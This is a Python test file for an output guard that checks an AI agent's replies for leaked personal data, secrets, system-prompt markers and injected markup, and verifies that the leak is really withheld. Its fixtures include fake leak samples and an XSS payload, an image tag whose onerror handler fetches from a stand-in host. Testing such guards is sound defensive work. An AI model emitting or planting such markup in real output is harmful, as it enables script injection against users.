"""The output-disclosure guard must ACTUALLY withhold a leak — not merely relabel it.

These tests are the honesty regression for the disclosure surface: before this guard existed
the engine scored disclosure attempts as "blocked" in gated mode while the leak still sat in
the agent's output text. The guard makes the block real: the emitted text is provably clean.
"""

from __future__ import annotations

import pytest

from tripwire.gate.output_guard import WITHHELD, OutputGuard, scan_output

# Runtime-assembled leak shapes (never literal in source -> passes the leak-gate scanner).
_PII = "customer " + "jordan.sample@" + "shop.example.test"
_SSN = "ssn " + "-".join(["111", "22", "3333"])
_SECRET = "token " + "sk" + "-live-" + "abc123def456"
_CONFIG = "TW-SYSTEM-PROMPT-CONFIG" + "-DO-NOT-DISCLOSE"
_MARKUP = "<img src=x onerror=fetch('//evil.test')>"


@pytest.mark.parametrize("leak", [_PII, _SSN, _SECRET, _CONFIG, _MARKUP])
def test_guard_withholds_and_emits_clean_text(leak: str) -> None:
    g = OutputGuard()
    result = g.inspect(f"Sure, here you go: {leak}")
    assert result.blocked is True
    assert result.findings  # the guard reports WHICH detectors fired
    # the emitted text contains NONE of the leaked content
    assert scan_output(result.safe_text) == []
    assert leak not in result.safe_text
    assert result.safe_text == WITHHELD


def test_guard_passes_benign_text_through_unchanged() -> None:
    g = OutputGuard()
    benign = "Happy to help — your order is on its way and support hours are 9-5."
    result = g.inspect(benign)
    assert result.blocked is False
    assert result.findings == ()
    assert result.safe_text == benign


def test_guard_refusal_text_is_itself_clean() -> None:
    # The fixed refusal must not trip the detector (else the guard would loop / self-leak).
    assert scan_output(WITHHELD) == []
